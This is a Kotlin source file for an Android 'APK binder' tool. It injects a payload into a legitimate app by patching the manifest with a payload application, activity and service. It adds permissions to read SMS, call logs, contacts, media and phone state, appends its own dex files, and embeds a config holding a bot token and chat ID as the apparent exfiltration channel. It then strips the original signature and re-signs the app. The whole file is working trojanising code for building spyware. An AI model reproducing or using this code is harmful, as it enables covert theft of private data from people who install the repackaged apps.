package Com.devhs.apkbinder.binder

import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import androidx.documentfile.provider.DocumentFile
import com.android.apksig.ApkSigner
import Com.devhs.apkbinder.core.Const
import Com.devhs.apkbinder.data.Feature
import Com.devhs.apkbinder.data.LogLevel
import Com.devhs.apkbinder.data.PayloadConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.security.KeyStore
import java.security.PrivateKey
import java.security.cert.X509Certificate
import java.util.zip.CRC32
import java.util.zip.ZipEntry
import java.util.zip.ZipFile
import java.util.zip.ZipOutputStream

class BinderEngine(private val ctx: Context) {

    private val permissions = listOf(
        "android.permission.INTERNET",
        "android.permission.READ_SMS",
        "android.permission.READ_CALL_LOG",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.READ_PHONE_STATE",
        "android.permission.POST_NOTIFICATIONS",
        "android.permission.FOREGROUND_SERVICE",
        "android.permission.FOREGROUND_SERVICE_DATA_SYNC"
    )

    suspend fun bind(
        source: Uri,
        activity: String,
        label: String,
        features: Set<Feature>,
        config: PayloadConfig,
        outDir: DocumentFile,
        onLog: (LogLevel, String) -> Unit
    ) = withContext(Dispatchers.IO) {

        onLog(LogLevel.INFO, "Preparing workspace...")
        val work = File(ctx.cacheDir, "bind_" + System.currentTimeMillis())
        work.mkdirs()

        val base = File(work, "base.apk")
        copyUri(source, base)
        if (base.length() < 1024) throw IllegalStateException("Invalid APK file")
        onLog(LogLevel.INFO, "Source APK: " + base.length() / 1024 + " KB")

        val srcZip = ZipFile(base)
        val manifestEntry = srcZip.getEntry("AndroidManifest.xml")
            ?: throw IllegalStateException("No AndroidManifest.xml in APK")
        val manifest = srcZip.getInputStream(manifestEntry).use { it.readBytes() }

        val originalApp = AxmlPatcher.readApplicationName(manifest)
        onLog(LogLevel.INFO, "Original application: " + (originalApp ?: "(none)"))
        onLog(LogLevel.INFO, "Manifest size: " + manifest.size + " bytes")

        onLog(LogLevel.INFO, "Patching AndroidManifest.xml...")
        val patched = try {
            AxmlPatcher.patch(
                manifest,
                Const.PAYLOAD_APP,
                Const.PAYLOAD_ACTIVITY,
                Const.PAYLOAD_SERVICE,
                permissions
            )
        } catch (t: Throwable) {
            srcZip.close()
            throw IllegalStateException(
                "Manifest patch failed: " + (t.message ?: "unknown") +
                    " (manifest=" + manifest.size + " bytes)"
            )
        }
        onLog(LogLevel.SUCCESS, "Manifest patched: " + manifest.size + " -> " + patched.size + " bytes")

        onLog(LogLevel.INFO, "Collecting payload dex...")
        val dexes = collectOwnDex()
        if (dexes.isEmpty()) {
            srcZip.close()
            throw IllegalStateException("Payload dex not found")
        }
        onLog(LogLevel.INFO, "Dex files: " + dexes.size)

        val maxDex = srcZip.entries().toList()
            .mapNotNull { Regex("^classes(\\d*)\\.dex$").find(it.name) }
            .map { it.groupValues[1].ifEmpty { "1" }.toInt() }
            .maxOrNull() ?: 0

        val cfgBytes = JSONObject().apply {
            put("token", config.token)
            put("chatId", config.chatId)
            put("origApp", originalApp ?: "")
            put("features", JSONArray(config.features))
            put("activity", activity)
        }.toString().toByteArray()

        val unsigned = File(work, "unsigned.apk")
        ZipOutputStream(FileOutputStream(unsigned).buffered()).use { zos ->
            for (e in srcZip.entries().toList()) {
                if (e.isDirectory) continue
                if (e.name == "AndroidManifest.xml") continue
                if (e.name == "assets/" + Const.CONFIG_ASSET) continue
                if (e.name.startsWith("META-INF/") &&
                    (e.name.endsWith(".SF") || e.name.endsWith(".RSA") ||
                        e.name.endsWith(".DSA") || e.name.endsWith(".MF"))
                ) continue

                val data = srcZip.getInputStream(e).use { it.readBytes() }
                val entry = ZipEntry(e.name)
                if (e.name == "resources.arsc") {
                    entry.method = ZipEntry.STORED
                    entry.size = data.size.toLong()
                    entry.compressedSize = data.size.toLong()
                    entry.crc = CRC32().apply { update(data) }.value
                } else entry.method = ZipEntry.DEFLATED
                zos.putNextEntry(entry)
                zos.write(data)
                zos.closeEntry()
            }
            srcZip.close()

            zos.putNextEntry(ZipEntry("AndroidManifest.xml"))
            zos.write(patched)
            zos.closeEntry()

            zos.putNextEntry(ZipEntry("assets/" + Const.CONFIG_ASSET))
            zos.write(cfgBytes)
            zos.closeEntry()

            dexes.forEachIndexed { i, bytes ->
                zos.putNextEntry(ZipEntry("classes" + (maxDex + i + 1) + ".dex"))
                zos.write(bytes)
                zos.closeEntry()
            }
        }
        onLog(LogLevel.SUCCESS, "Archive built: " + unsigned.length() / 1024 + " KB")

        val finalApk = File(work, "final.apk")
        try {
            onLog(LogLevel.INFO, "Signing APK...")
            sign(unsigned, finalApk)
            onLog(LogLevel.SUCCESS, "Signed OK")
        } catch (t: Throwable) {
            onLog(LogLevel.WARN, "Signing failed: " + (t.message ?: "unknown"))
            unsigned.copyTo(finalApk, overwrite = true)
        }

        // --- অ্যান্ড্রয়েডের নিজের পার্সার দিয়ে যাচাই ---
        val info = try {
            ctx.packageManager.getPackageArchiveInfo(
                finalApk.absolutePath,
                PackageManager.GET_ACTIVITIES or PackageManager.GET_SERVICES
            )
        } catch (t: Throwable) {
            onLog(LogLevel.WARN, "Verify error: " + (t.message ?: "unknown"))
            null
        }

        if (info == null) {
            onLog(LogLevel.ERROR, "Manifest parse: FAILED (Android cannot read it)")
        } else {
            onLog(LogLevel.SUCCESS, "Manifest parse: OK")
            onLog(LogLevel.INFO, "Package: " + info.packageName)
            onLog(LogLevel.INFO, "minSdk: " + (info.applicationInfo?.minSdkVersion ?: 0) +
                "  targetSdk: " + (info.applicationInfo?.targetSdkVersion ?: 0))
            onLog(LogLevel.INFO, "App class: " + (info.applicationInfo?.className ?: "(none)"))
            val acts = info.activities?.mapNotNull { it.name } ?: emptyList()
            val hasGate = acts.any { it.endsWith("PermissionGateActivity") }
            onLog(
                if (hasGate) LogLevel.SUCCESS else LogLevel.ERROR,
                "Permission activity present: " + hasGate
            )
        }

        val safeLabel = label.replace(Regex("[^A-Za-z0-9]+"), "_").trim('_').take(40)
            .ifBlank { "App" }
        val name = "Hs_Apk_Binder_" + safeLabel + "_" + System.currentTimeMillis() + ".apk"

        val doc = outDir.createFile("application/vnd.android.package-archive", name)
            ?: throw IllegalStateException("Cannot create output file")
        ctx.contentResolver.openOutputStream(doc.uri)!!.use { os ->
            finalApk.inputStream().use { it.copyTo(os) }
        }
        onLog(LogLevel.SUCCESS, "Saved: " + doc.name)
        onLog(LogLevel.SUCCESS, "APK Binding Completed!")

        work.deleteRecursively()
    }

    private fun copyUri(uri: Uri, target: File) {
        val stream = if (uri.scheme == "file") {
            File(uri.path!!).inputStream()
        } else {
            ctx.contentResolver.openInputStream(uri) ?: throw IllegalStateException("Cannot open APK")
        }
        stream.use { input -> target.outputStream().use { input.copyTo(it) } }
    }

    private fun collectOwnDex(): List<ByteArray> {
        val info = ctx.packageManager.getApplicationInfo(ctx.packageName, PackageManager.GET_META_DATA)
        val paths = ArrayList<String>()
        info.sourceDir?.let { paths.add(it) }
        info.splitSourceDirs?.let { paths.addAll(it) }

        val out = ArrayList<ByteArray>()
        for (path in paths) {
            try {
                ZipFile(path).use { z ->
                    z.entries().toList()
                        .filter { Regex("^classes\\d*\\.dex$").matches(it.name) }
                        .sortedBy { it.name }
                        .forEach { e -> out.add(z.getInputStream(e).use { it.readBytes() }) }
                }
            } catch (_: Throwable) {
            }
        }
        return out
    }

    private fun sign(input: File, output: File) {
        val ks = KeyStore.getInstance("PKCS12")
        ctx.assets.open(Const.KEYSTORE_ASSET).use { ks.load(it, Const.KS_PASS.toCharArray()) }
        val key = ks.getKey(Const.KS_ALIAS, Const.KS_PASS.toCharArray()) as PrivateKey
        val cert = ks.getCertificate(Const.KS_ALIAS) as X509Certificate

        val signerConfig = ApkSigner.SignerConfig.Builder(Const.KS_ALIAS, key, listOf(cert)).build()
        ApkSigner.Builder(listOf(signerConfig))
            .setInputApk(input)
            .setOutputApk(finalApkOut(output))
            .setV1SigningEnabled(true)
            .setV2SigningEnabled(true)
            .setV3SigningEnabled(true)
            .setMinSdkVersion(26)
            .build()
            .sign()
    }

    private fun finalApkOut(file: File): File = file
}
